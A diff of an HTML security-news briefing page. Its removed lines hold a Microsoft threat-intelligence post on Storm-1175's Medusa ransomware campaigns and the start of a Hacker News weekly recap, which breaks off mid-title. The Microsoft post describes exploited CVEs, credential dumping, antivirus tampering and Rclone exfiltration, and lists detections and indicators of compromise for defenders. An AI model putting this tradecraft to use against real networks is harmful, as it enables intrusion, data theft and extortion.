@@ -59,187 +59,351 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-04-07</h1>
+        <h1>Security Briefing // 2026-04-08</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">Storm-1175 focuses gaze on vulnerable web-facing assets in high-tempo Medusa ransomware operations</button></li><li><button onclick="show('art-1')">⚡ Weekly Recap: Axios Hack, Chrome 0-Day, Fortinet Exploits, Paragon Spyware and More</button></li><li><button onclick="show('art-2')">Germany Doxes “UNKN,” Head of RU Ransomware Gangs REvil, GandCrab</button></li><li><button onclick="show('art-3')">New FortiClient EMS flaw exploited in attacks, emergency patch released</button></li><li><button onclick="show('art-4')">UNC1069 Social Engineering of Axios Maintainer Led to npm Supply Chain Attack</button></li><li><button onclick="show('art-5')">North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in Supply Chain Attack</button></li><li><button onclick="show('art-6')">Building a Detection Foundation: Part 4 - Sysmon</button></li><li><button onclick="show('art-7')">CISA Adds Five Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-8')">Iran-Backed Hackers Claim Wiper Attack on Medtech Firm Stryker</button></li><li><button onclick="show('art-9')">Updates to the MSSQLHound OpenGraph Collector for BloodHound</button></li></ul>
+            <ul><li><button onclick="show('art-0')">Iran-Linked Hackers Disrupt U.S. Critical Infrastructure by Targeting Internet-Exposed PLCs</button></li><li><button onclick="show('art-1')">US warns of Iranian hackers targeting critical infrastructure</button></li><li><button onclick="show('art-2')">Russia Hacked Routers to Steal Microsoft Office Tokens</button></li><li><button onclick="show('art-3')">[Webinar] How to Close Identity Gaps in 2026 Before AI Exploits Enterprise Risk</button></li><li><button onclick="show('art-4')">Building a Detection Foundation: Part 5 - Correlation in Practice</button></li><li><button onclick="show('art-5')">Germany Doxes “UNKN,” Head of RU Ransomware Gangs REvil, GandCrab</button></li><li><button onclick="show('art-6')">Mitigating the Axios npm supply chain compromise</button></li><li><button onclick="show('art-7')">North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in Supply Chain Attack</button></li><li><button onclick="show('art-8')">CISA Adds Five Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-9')">Updates to the MSSQLHound OpenGraph Collector for BloodHound</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
-            <h2 class="article-title">Storm-1175 focuses gaze on vulnerable web-facing assets in high-tempo Medusa ransomware operations</h2>
-            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/04/06/storm-1175-focuses-gaze-on-vulnerable-web-facing-assets-in-high-tempo-medusa-ransomware-operations/" target="_blank">Original Link</a></p>
-            <div class="content-text">The financially motivated cybercriminal actor tracked by Microsoft Threat Intelligence as Storm-1175 operates high-velocity ransomware campaigns that weaponize N-days, targeting vulnerable, web-facing systems during the window between vulnerability disclosure and widespread patch adoption. Following successful exploitation, Storm-1175 rapidly moves from initial access to data exfiltration and deployment of Medusa ransomware, often within a few days and, in some cases, within 24 hours. The threat actor’s high operational tempo and proficiency in identifying exposed perimeter assets have proven successful, with recent intrusions heavily impacting healthcare organizations, as well as those in the education, professional services, and finance sectors in Australia, United Kingdom, and United States.
-The pace of Storm-1175’s campaigns is enabled by the threat actor’s consistent use of recently disclosed vulnerabilities to obtain initial access. While the threat actor typically uses N-day vulnerabilities, we have also observed Storm-1175 leveraging zero-day exploits, in some cases a full week before public vulnerability disclosure. The threat actor has also been observed chaining together multiple exploits to enable post-compromise activity. After initial access, Storm-1175 establishes persistence by creating new user accounts, deploys various tools including remote monitoring and management software for lateral movement, conducts credential theft, and tampers with security solutions before deploying ransomware throughout the compromised environment.
-RANSOMWARE AS A SERVICE
-In this blog post, we delve into the attack techniques attributed to Storm-1175 over several years. While Storm-1175’s methodology aligns with the tactics, techniques, and procedures (TTPs) of many tracked ransomware actors, analysis of their post-compromise tactics provides essential insights into how organizations can harden and defend against attackers like Storm-1175, informing opportunities to disrupt attackers even if they have gained initial access to a network.
-Storm-1175’s rapid attack chain: From initial access to impact
-Exploitation of vulnerable web-facing assets
-Storm-1175 rapidly weaponizes recently disclosed vulnerabilities to obtain initial access. Since 2023, Microsoft Threat Intelligence has observed exploitation of over 16 vulnerabilities, including:
-[CVE-2023-21529](https://nvd.nist.gov/vuln/detail/CVE-2023-21529)(Microsoft Exchange)[CVE-2023-27351](https://nvd.nist.gov/vuln/detail/CVE-2023-27351)and[CVE-2023-27350](https://nvd.nist.gov/vuln/detail/CVE-2023-27350)(Papercut)[CVE-2023-46805](https://nvd.nist.gov/vuln/detail/CVE-2023-46805)and[CVE-2024-21887](https://nvd.nist.gov/vuln/detail/CVE-2024-21887)(Ivanti Connect Secure and Policy Secure)[CVE-2024-1709](https://nvd.nist.gov/vuln/detail/CVE-2024-1709)and[CVE-2024-1708](https://nvd.nist.gov/vuln/detail/CVE-2024-1708)(ConnectWise ScreenConnect)[CVE-2024-27198](https://nvd.nist.gov/vuln/detail/CVE-2024-27198)and[CVE-2024-27199](https://nvd.nist.gov/vuln/detail/CVE-2024-27199)(JetBrains TeamCity)[CVE-2024-57726](https://nvd.nist.gov/vuln/detail/CVE-2024-57726),[CVE-2024-57727](https://nvd.nist.gov/vuln/detail/CVE-2024-57727), and[CVE-2024-57728](https://nvd.nist.gov/vuln/detail/CVE-2024-57728)(SimpleHelp)[CVE‑2025‑31161](https://nvd.nist.gov/vuln/detail/CVE-2025-31161)(CrushFTP)[CVE-2025-10035](https://nvd.nist.gov/vuln/detail/CVE-2025-10035)(GoAnywhere MFT)[CVE-2025-52691](https://nvd.nist.gov/vuln/detail/CVE-2025-52691)and[CVE-2026-23760](https://nvd.nist.gov/vuln/detail/CVE-2026-23760)(SmarterMail)[CVE-2026-1731](https://nvd.nist.gov/vuln/detail/CVE-2026-1731)(BeyondTrust)
-Storm-1175 rotates exploits quickly during the time between disclosure and patch availability or adoption, taking advantage of the period where many organizations remain unprotected. In some cases, Storm-1175 has weaponized exploits for disclosed vulnerabilities in as little as one day, as was the case for CVE-2025-31324 impacting SAP NetWeaver: the security issue was disclosed on April 24, 2025, and we observed Storm-1175 exploitation soon after on April 25.
-In multiple intrusions, Storm-1175 has chained together exploits to enable post-compromise activities like remote code execution (RCE). For example, in July 2023, Storm-1175 exploited two vulnerabilities affecting on-premises Microsoft Exchange Servers, [dubbed “OWASSRF” by public researchers](https://www.crowdstrike.com/en-us/blog/owassrf-exploit-analysis-and-recommendations/): exploitation of CVE‑2022‑41080 provided initial access by exposing Exchange PowerShell via Outlook Web Access (OWA), and Storm-1175 subsequently exploited CVE‑2022‑41082 to achieve remote code execution.
-Storm-1175 has also demonstrated a capability for targeting Linux systems as well: in late 2024, Microsoft Threat Intelligence identified the exploitation of vulnerable Oracle WebLogic instances across multiple organizations, though we were unable to identify the exact vulnerability being exploited in these attacks.
-Finally, we have also observed the use of at least three zero-day vulnerabilities including, most recently, CVE-2026-23760 in SmarterMail, which was exploited by Storm-1175 the week prior to public disclosure, and CVE-2025-10035 in GoAnywhere Managed File Transfer, also exploited one week before public disclosure. While these more recent attacks demonstrate an evolved development capability or new access to resources like exploit brokers for Storm-1175, it is worth noting that GoAnywhere MFT has previously been targeted by ransomware attackers, and that the SmarterMail vulnerability was reportedly [similar to a previously disclosed flaw](https://labs.watchtowr.com/attackers-with-decompilers-strike-again-smartertools-smartermail-wt-2026-0001-auth-bypass/); these factors may have helped to facilitate subsequent zero-day exploitation activity by Storm-1175, who still primarily leverages N-day vulnerabilities. Regardless, as attackers increasingly become more adept at identifying new vulnerabilities, understanding your digital footprint—such as through the use of public scanning interfaces like [Microsoft Defender External Attack Surface Management](https://www.microsoft.com/security/business/cloud-security/microsoft-defender-external-attack-surface-management)—is essential to defending against perimeter network attacks.
-Covert persistence and lateral movement
-During exploitation, Storm-1175 typically creates a web shell or drops a remote access payload to establish their initial hold in the environment. From this point, Microsoft Threat Intelligence has observed Storm-1175 moving from initial access to ransomware deployment in as little as one day, though many of the actor’s attacks have occurred over a period of five to six days.
-On the initially compromised device, the threat actor often establishes persistence by creating a new user and adding that user to the administrators group:
-From this account, Storm-1175 begins their reconnaissance and lateral movement activity. Storm-1175 has a rotation of tools to accomplish these subsequent attack stages. Most commonly, we observe the use of living-off-the-land binaries (LOLBins), including PowerShell and PsExec, followed by the use of Cloudflare tunnels (renamed to mimic legitimate binaries like conhost.exe) to move laterally over Remote Desktop Protocol (RDP) and deliver payloads to new devices. If RDP is not allowed in the environment, Storm-1175 has been observed using administrator privileges to modify the Windows Firewall policy to enable Remote Desktop.
-Storm-1175 has also demonstrated a heavy reliance on remote monitoring and management (RMM) tools during post-compromise activity. Since 2023, Storm-1175 has used multiple RMMs, including:
-- Atera RMM
-- Level RMM
-- N-able
-- DWAgent
-- MeshAgent
-- ConnectWise ScreenConnect
-- AnyDesk
-- SimpleHelp
-While often used by enterprise IT teams, these RMM tools have multi-pronged functionality that could also allow adversaries to maintain persistence in a compromised network, create new user accounts, enable an alternative command-and-control (C2) method, deliver additional payloads, or use as an interactive remote desktop session.
-In many attacks, Storm-1175 relies on PDQ Deployer, a legitimate software deployment tool that lets system administrators silently install applications, for both lateral movement and payload delivery, including ransomware deployment throughout the network.
-Additionally, Storm-1175 has leveraged Impacket for lateral movement. Impacket is a collection of open-source Python classes designed for working with network protocols, and it is popular with adversaries due to ease of use and wide range of capabilities. Microsoft Defender for Endpoint has a dedicated attack surface reduction rule to defend against lateral movement techniques used by Impacket: [Block process creations originating from PSExec and WMI commands](https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference#block-process-creations-originating-from-psexec-and-wmi-commands)); [protecting lateral movement pathways](https://www.microsoft.com/en-us/security/blog/2022/10/26/how-to-prevent-lateral-movement-attacks-using-microsoft-365-defender/) can also mitigate Impacket.
-Credential theft
-Impacket is further used to facilitate credential dumping through LSASS; the threat actor also leveraged the commodity credential theft tool Mimikatz in identified intrusions in 2025. Additionally, Storm-1175 has relied on known living-off-the-land techniques for stealing credentials, such as by modifying the registry entry UseLogonCredential to turn on WDigest credential caching, or using Task Manager to dump LSASS credentials; for both of these attack techniques, the threat actor must obtain local administrative privileges to modify these resources. The attack surface reduction rule [block credential stealing from LSASS](https://learn.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?ocid=magicti_ta_learndoc#block-credential-stealing-from-the-windows-local-security-authority-subsystem) can limit the effectiveness of this type of attack, and—more broadly—limiting the use of local administrator rights by end users. Ensuring that local administrator passwords are not shared through the environment can also reduce the risk of these LSASS dumping techniques.
-We have also observed that after gaining administrator credentials, Storm-1175 has used a script to recover passwords from Veeam backup software, which is used to connect to remote hosts, therefore enabling ransomware deployment to additional connected systems.
-With sufficient privileges, Storm-1175 can then use tools like PsExec to pivot to a Domain Controller, where they have accessed the NTDS.dit dump, a copy of the Active Directory database which contains user data and passwords that can be cracked offline. This privileged position has also granted Storm-1175 access to the security account manager (SAM), which provides detailed configuration and security settings, enabling an attacker to understand and manipulate the system environment on a much wider scale.
-Security tampering for ransomware delivery
-Storm-1175 modifies the Microsoft Defender Antivirus settings stored in the registry to tamper with the antivirus software and prevent it from blocking ransomware payloads; in order to accomplish this, an attacker must have access to highly privileged accounts that can modify the registry directly. For this reason, prioritizing alerts related to credential theft activity, which typically indicate an active attacker in the environment, is essential to responding to ransomware signals and preventing attackers from gaining privileged account access.
-Storm-1175 has also used encoded PowerShell commands to add the C:\ drive to the antivirus exclusion path, preventing the security solution from scanning the drive and allowing payloads to run without any alerts. Defenders can harden against these tampering techniques by combining tamper protection with the DisableLocalAdminMerge setting, which prevents attackers from using local administrator privileges to set antivirus exclusions.
-Data exfiltration and ransomware deployment
-Like other [ransomware as a service](https://www.microsoft.com/en-us/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/) (RaaS) offerings, Medusa offers a leak site to facilitate double extortion operations for its affiliates: attackers not only encrypt data, but steal the data and hold it for ransom, threatening to leak the files publicly if a ransom is not paid. To that aim, Storm-1175 often uses Bandizip to collect files and Rclone for data exfiltration. Data synchronization tools like Rclone allow threat actors to easily transfer large volumes of data to a remote attacker-owned cloud resource. These tools also provide data synchronization capabilities, moving newly created or updated files to cloud resources in real-time to enable continuous exfiltration throughout all stages of the attack without needing attacker interaction.
-Finally, having gained sufficient access throughout the network, Storm-1175 frequently leverages PDQ Deployer to launch a script (RunFileCopy.cmd) and deliver Medusa ransomware payloads. In some cases, Storm-1175 has alternatively used highly privileged access to create a Group Policy update to broadly deploy ransomware.
-Mitigation and protection guidance
-To defend against Storm-1175 TTPs and similar activity, Microsoft recommends the following mitigation measures:
-- Use a perimeter scanning tool like Microsoft Defender External Attack Surface Management to understand your organization’s digital footprint and potential attack surface. Targeting web-facing vulnerabilities continues to be one of the most effective attack methods for initial access.
-- Ensure any web-facing systems are isolated from the public internet with a secure network boundary and access them with a virtual private network (VPN). If certain servers must be accessible on the public internet, position them behind a
-[web application firewall (WAF)](https://azure.microsoft.com/products/web-application-firewall/),[reverse proxy](https://microsoft.github.io/reverse-proxy/articles/getting-started.html), or[perimeter network](https://learn.microsoft.com/azure/architecture/reference-architectures/dmz/secure-vnet-dmz)(also known as a DMZ), which can reduce the risk of vulnerability exploitation in some cases. - Follow the
-[defending against ransomware](https://www.microsoft.com/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/#defending-against-ransomware?ocid=magicti_ta_blog)guidance in Microsoft’s ransomware as a service blog post, which details how to build credential hygiene as well as how to limit lateral movement using the principle of least privilege. - Implement
-[Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/how-it-works), a critical security feature that protects credentials stored in process memory – in the LSA process lsass.exe. Credential Guard is turned on by default in Windows 11. However, if Credential Guard was previously disabled on a device, updating a device to Windows 11 does not override that setting, and Credential Guard will need to be re-enabled. Additionally, Credential Guard should be enabled before a device is joined to a domain or before a domain user signs in for the first time. If Credential Guard is enabled after domain join, the user and device secrets may already be compromised. Credential Guard[can be enabled using Group Policy, the registry, or Microsoft Intune](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/configure?tabs=intune#enable-credential-guard). - Turn on tenant-wide
-[tamper protection](https://learn.microsoft.com/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?ocid=magicti_ta_learndoc)features to prevent attackers from stopping security services or using antivirus exclusions. Without tamper protection, attackers could simply turn off Microsoft Defender Antivirus without the need to acquire higher privileges.- Customers running Intune or Microsoft Defender for Endpoint Security Configuration can
-[enable DisableLocalAdminMerge to prevent modification of antivirus exclusions via GPO](https://learn.microsoft.com/microsoft-365/security/defender-endpoint/manage-tamper-protection-intune?ocid=magicti_ta_learndoc#tamper-protection-for-antivirus-exclusions). - In addition to tamper protection, you can also
-[enable and configure Microsoft Defender Antivirus always-on protection in Group Policy](https://learn.microsoft.com/microsoft-365/security/defender-endpoint/configure-real-time-protection-microsoft-defender-antivirus?ocid=magicti_ta_learndoc). - If there is an issue with a device during roll out of various antivirus features, the device can be placed in
-[Troubleshooting mode](https://learn.microsoft.com/microsoft-365/security/defender-endpoint/enable-troubleshooting-mode?ocid=magicti_ta_learndoc)to turn off Tamper Protection temporarily without impacting the wider organizational security policy.
-- Customers running Intune or Microsoft Defender for Endpoint Security Configuration can
-- For approved RMM systems used in your environment, enforce security settings where possible to implement MFA. If an unapproved RMM installation is discovered in your network, reset passwords for accounts used to install the RMM services. If a System-level account was used to install the software, further investigation may be warranted.
-- Configure
-[automatic attack disruption](https://learn.microsoft.com/defender-xdr/configure-attack-disruption)in Microsoft Defender XDR. Automatic attack disruption is designed to contain attacks in progress, limit the impact on an organization’s assets, and provide more time for security teams to remediate the attack fully. - Microsoft Defender XDR customers can turn on
-[attack surface reduction rules](https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction?view=o365-worldwide)to prevent common attack techniques used in ransomware attacks:[Block credential stealing from the Windows local security authority subsystem (lsass.exe)](https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction#block-credential-stealing-from-the-windows-local-security-authority-subsystem)[Block execution of potentially obfuscated scripts](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-execution-of-potentially-obfuscated-scripts)[Block Webshell creation for Servers](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-webshell-creation-for-servers)[Block process creations originating from PSExec and WMI commands](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-process-creations-originating-from-psexec-and-wmi-commands)(Some organizations might experience compatibility issues with this rule on certain server systems but should deploy it to other systems to prevent lateral movement originating from PsExec and WMI.)[Block execution of potentially obfuscated scripts](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-execution-of-potentially-obfuscated-scripts)[Block use of copied or impersonated system tools](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-use-of-copied-or-impersonated-system-tools)[Use advanced protection against ransomware](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#use-advanced-protection-against-ransomware)
-Microsoft Defender detections
-[Microsoft Defender](https://www.microsoft.com/security/business/microsoft-defender) customers can refer to the list of applicable detections below. Microsoft Defender coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog.
-| Tactic | Observed activity | Microsoft Defender coverage |
-| Initial Access | Storm-1175 exploits vulnerable web-facing applications |
-– Ransomware-linked threat actor detected – Possible Beyond Trust software vulnerability exploitation – Possible exploitation of GoAnywhere MFT vulnerability – Possible SAP NetWeaver vulnerability exploitation Possible exploitation of JetBrains TeamCity vulnerability – Suspicious command execution via ScreenConnect – Suspicious service launched |
-[Microsoft Defender for Endpoint](https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint)– User account created under suspicious circumstances
-– New local admin added using Net commands
-– New group added suspiciously
-– Suspicious account creation
-– Suspicious Windows account manipulation
-– Anomalous account lookups
-[Microsoft Defender Antivirus](https://www.microsoft.com/windows/comprehensive-security)– Behavior:Win32/SAMDumpz
-[Microsoft Defender for Endpoint](https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint)– Exposed credentials at risk of compromise
-– Compromised account credentials
-– Process memory dump
-[Microsoft Defender for Endpoint](https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint)– Suspicious Atera activity
-– File dropped and launched from remote location
-[Microsoft Defender Antivirus](https://www.microsoft.com/windows/comprehensive-security)– Behavior:Win32/PsexecRemote
-[Microsoft Defender for Endpoint](https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint)– Hands-on-keyboard attack involving multiple devices
-– Remote access software
-– Suspicious PowerShell command line
-– Suspicious PowerShell download or encoded command execution
-– Ransomware-linked threat actor detected
-[Microsoft Defender for Endpoint](https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint)– Potential human-operated malicious activity
-– Renaming of legitimate tools for possible data exfiltration
-– Possible data exfiltration
-– Hidden dual-use tool launch attempt
-[Microsoft Defender for Endpoint](https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint)– Defender detection bypass
-– Attempt to turn off Microsoft Defender Antivirus protection
-[Microsoft Defender Antivirus](https://www.microsoft.com/windows/comprehensive-security)– Ransom:Win32/Medusa
-[Microsoft Defender for Endpoint](https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint)– Possible ransomware activity based on a known malicious extension
-– Possible compromised user account delivering ransomware-related files
-– Potentially compromised assets exhibiting ransomware-like behavior
-– Ransomware behavior detected in the file system
-– File dropped and launched from remote location
-Microsoft Security Copilot
-[Microsoft Security Copilot](https://www.microsoft.com/en-us/security/business/ai-machine-learning/microsoft-security-copilot) is [embedded in Microsoft Defender](https://learn.microsoft.com/defender-xdr/security-copilot-in-microsoft-365-defender) and provides security teams with AI-powered capabilities to summarize incidents, analyze files and scripts, summarize identities, use guided responses, and generate device summaries, hunting queries, and incident reports.
-Customers can also [deploy AI agents](https://learn.microsoft.com/defender-xdr/security-copilot-agents-defender), including the following [Microsoft Security Copilot agents](https://learn.microsoft.com/copilot/security/agents-overview), to perform security tasks efficiently:
-[Threat Intelligence Briefing agent](https://learn.microsoft.com/defender-xdr/threat-intel-briefing-agent-defender)[Phishing Triage agent](https://learn.microsoft.com/defender-xdr/phishing-triage-agent)[Threat Hunting agent](https://learn.microsoft.com/defender-xdr/advanced-hunting-security-copilot-threat-hunting-agent)[Dynamic Threat Detection agent](https://learn.microsoft.com/defender-xdr/dynamic-threat-detection-agent)
-Security Copilot is also available as a [standalone experience](https://learn.microsoft.com/en-us/copilot/security/experiences-security-copilot) where customers can perform specific security-related tasks, such as incident investigation, user analysis, and vulnerability impact assessment. In addition, Security Copilot offers [developer scenarios](https://learn.microsoft.com/copilot/security/developer/custom-agent-overview) that allow customers to build, test, publish, and integrate AI agents and plugins to meet unique security needs.
-Threat intelligence reports
-Microsoft Defender XDR customers can use the following [threat analytics](https://learn.microsoft.com/defender-xdr/threat-analytics) reports in the Defender portal (requires license for at least one Defender XDR product) to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments.
-[Actor profile: Storm-1175](https://security.microsoft.com/threatanalytics3/5db46cbf-9bd3-4f63-83d5-bded91408025/overview?)[Tool profile: Medusa ransomware](https://security.microsoft.com/threatanalytics3/adb12f14-423e-4d0f-9865-dea310335621/overview?)[Threat overview profile: Human-operated ransomware](https://security.microsoft.com/threatanalytics3/b42038f7-a361-40c0-bcaf-5dbb63f33dc3/overview?)
-Indicators of compromise
-The following indicators are gathered from identified Storm-1175 attacks during 2026.
-| Indicator | Type | Description | First seen | Last seen |
-| 0cefeb6210b7103fd32b996beff518c9b6e1691a97bb1cda7f5fb57905c4be96 | SHA-256 | Gaze.exe (Medusa Ransomware) | 2026-03-01 | 2026-03-01 |
-| 9632d7e4a87ec12fdd05ed3532f7564526016b78972b2cd49a610354d672523c *Note that we have seen this hash in ransomware intrusions by other threat actors since 2024 as well | SHA-256 | lsp.exe (Rclone) | 2024-04-01 | 2026-02-18 |
-| e57ba1a4e323094ca9d747bfb3304bd12f3ea3be5e2ee785a3e656c3ab1e8086 | SHA-256 | main.exe (SimpleHelp) | 2026-01-15 | 2026-01-15 |
-| 5ba7de7d5115789b952d9b1c6cff440c9128f438de933ff9044a68fff8496d19 | SHA-256 | moon.exe (SimpleHelp) | 2025-09-15 | 2025-09-22 |
-| 185.135.86[.]149 | IP | SimpleHelp C2 | 2024-02-23 | 2026-03-15 |
-| 134.195.91[.]224 | IP | SimpleHelp C2 | 2024-02-23 | 2026-02-26 |
-| 85.155.186[.]121 | IP | SimpleHelp C2 | 2024-02-23 | 2026-02-12 |
-References
-[Attackers With Decompilers Strike Again (SmarterTools SmarterMail WT-2026-0001 Auth Bypass)](https://labs.watchtowr.com/attackers-with-decompilers-strike-again-smartertools-smartermail-wt-2026-0001-auth-bypass/)[OWASSRF: CrowdStrike Identifies New Exploit Method for Exchange Bypassing ProxyNotShell Mitigations](https://www.crowdstrike.com/en-us/blog/owassrf-exploit-analysis-and-recommendations/)
-Learn more
-For the latest security research from the Microsoft Threat Intelligence community, check out the [Microsoft Threat Intelligence Blog](https://aka.ms/threatintelblog).
-To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
-To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-1" class="article-body">
-            <h2 class="article-title">⚡ Weekly Recap: Axios Hack, Chrome 0-Day, Fortinet Exploits, Paragon Spyware and More</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/weekly-recap-axios-hack-chrome-0-day.html" target="_blank">Original Link</a></p>
-            <div class="content-text">This week had real hits. The key software got tampered with. Active bugs showed up in the tools people use every day. Some attacks didn’t even need much effort because the path was already there.
-One weak spot now spreads wider than before. What starts small can reach a lot of systems fast. New bugs, faster use, less time to react.
-That’s this week. Read through it.
-⚡ Threat of the Week
-[Axios npm Package Compromised by N. Korean Hackers](https://thehackernews.com/2026/04/unc1069-social-engineering-of-axios.html)—Threat actors with ties to North Korea seized control of the npm account belonging to the lead maintainer of Axios, a popular npm package with nearly 100 million weekly downloads, to push malicious versions containing a cross-platform malware dubbed WAVESHAPER.V2. The activity has been attributed to a financially motivated threat actor known as UNC1069. The incident demonstrates how quickly the compromise of a popular npm package can have ripple effects through the ecosystem. The malware's self-deleting anti-forensic cleanup points to a deliberate, planned operation. "The build pipeline is becoming the new front line. Attackers know that if they can compromise the systems that build and distribute software, they can inherit trust at scale," Avital Harel, Security Researcher at Upwind, said. "That's what makes these attacks so dangerous -- they're not just targeting one application, they’re targeting the process behind many of them. Organizations should be looking much more closely at CI/CD systems, package dependencies, and developer environments, because that's increasingly where attackers are placing their bets." Ismael Valenzuela, vice president of Labs, Threat Research, and Intelligence at Arctic Wolf, said the Axios npm compromise reflects a broader trend where attackers infiltrate trusted, widely used software components to obtain access to downstream customers at scale. "Even though the malicious versions were available for only a few hours, Axios is so deeply embedded across enterprise applications that organizations may have unknowingly pulled the compromised code into their environments through build pipelines or downstream dependencies," Valenzuela added. "That downstream exposure is what makes these incidents particularly difficult to spot and contain, especially for teams that never directly chose to install Axios themselves. This incident reinforces that security teams need to treat build‑time tools and dependencies as part of the attack surface and not just trust tools by default."
-Inside the 2026 Cyber Workforce: Skills, Shortages, and Shifts in the Age of AI
-Inside the 2026 Cyber Workforce: Skills, Shortages, and Shifts in the Age of AI
-Insights to help leaders make informed decisions and show practitioners where careers are heading.
-[Download Now ➝](https://thehackernews.uk/sans-cyber-workforce-2026)
-🔔 Top News
-[Google Patches Actively Exploited Chrome 0-Day](https://thehackernews.com/2026/04/new-chrome-zero-day-cve-2026-5281-under.html)—Google released security updates for its Chrome web browser to address 21 vulnerabilities, including a zero-day flaw that it said has been exploited in the wild. The high-severity vulnerability, CVE-2026-5281 (CVSS score: N/A), concerns a use-after-free bug in Dawn, an open-source and cross-platform implementation of the WebGPU standard. Users are advised to update their Chrome browser to versions 146.0.7680.177/178 for Windows and Apple macOS, and 146.0.7680.177 for Linux. Google did not reveal how the vulnerability is being exploited and who is behind the exploitation effort.[TrueConf 0-Day Exploited in Attacks Targeting Government Entities in Southeast Asia](https://thehackernews.com/2026/03/trueconf-zero-day-exploited-in-attacks.html)—Chinese hackers have exploited a zero-day vulnerability in the TrueConf video conferencing software in attacks against government entities in Southeast Asia. The exploited flaw, tracked as CVE-2026-3502 (CVSS score of 7.8), exists because of a lack of integrity checks when fetching application update code, allowing an attacker to distribute a tampered update. "The compromised TrueConf on-premises server was operated by the governmental IT department and served as a video conferencing platform for dozens of government entities across the country, which were all supplied with the same malicious update," Check Point said. The activity, which began in January 2026, involved the deployment of the Havoc framework. Most infections likely began with a link sent to the victims. TrueConf is used widely across organizations in Asia, Europe, and the Americas, serving about 100,000 organizations globally.[Fortinet FortiClient EMS Flaw Under Attack](https://thehackernews.com/2026/04/fortinet-patches-actively-exploited-cve.html)—Fortinet released out-of-band patches for a critical security flaw impacting FortiClient EMS (CVE-2026-35616) that it said has been exploited in the wild. The vulnerability has been described as a pre-authentication API access bypass leading to privilege escalation. Exploitation efforts against CVE-2026-35616 were first recorded against its honeypots on March 31, 2026, per watchTowr. The development comes days after another recently patched, critical vulnerability in FortiClient EMS (CVE-2026-21643) came under active exploitation.[Apple Backports DarkSword Fixes to More Devices](https://thehackernews.com/2026/04/apple-expands-ios-1877-update-to-more.html)—Apple expanded the availability of iOS 18.7.7 and iPadOS 18.7.7 to a broader range of devices to protect users from the risk posed by a recently disclosed exploit kit known as DarkSword. The update targets customers whose devices are capable of upgrading to the newest operating system (iOS 26), but have chosen to remain on iOS 18. Apple has taken the unprecedented step to counter risks posed by an exploit kit called DarkSword. The broader availability of the patches underscores the level of threat that malware like DarkSword poses. The fact that a large number of users were still using iOS 18, combined with the leak of a new version of DarkSword on GitHub, has pushed Apple towards releasing the fix so that they can stay protected without the need for updating to iOS 26. The leak is significant as it puts it within reach of less technically savvy cybercriminals out there.[ClickFix Attack Leads to DeepLoad Malware](https://thehackernews.com/2026/03/deepload-malware-uses-clickfix-and-wmi.html)—The ClickFix technique is being used to deliver a stealthy malware named DeepLoad that's capable of stealing credentials and intercepting browser interactions. The malware first emerged on a dark web cybercrime forum in early February 2026, when a threat actor, using the alias "MysteryHack," advertised it as a "centralized panel for multiple types of malware." According to[ZeroFox](https://www.zerofox.com/intelligence/flash-report-cryptocurrency-stealer-for-sale-on-dark-web/), "DeepLoad's design is explicitly focused on actively facilitating real-time cryptocurrency theft, which almost certainly makes it an attractive malware suite in the cybercrime-as-a-service (CaaS) environment." The malware has since been distributed to Windows systems through ClickFix under the guise of resolving fake browser error messages. Besides stealing credentials, the malware drops a rogue browser extension to intercept sensitive data and spreads via removable USB drives. DeepLoad's actual attack logic is buried under layers of obfuscation, raising the possibility that some parts of the malware were developed using an artificial intelligence (AI) model.[Claude Code Source Code 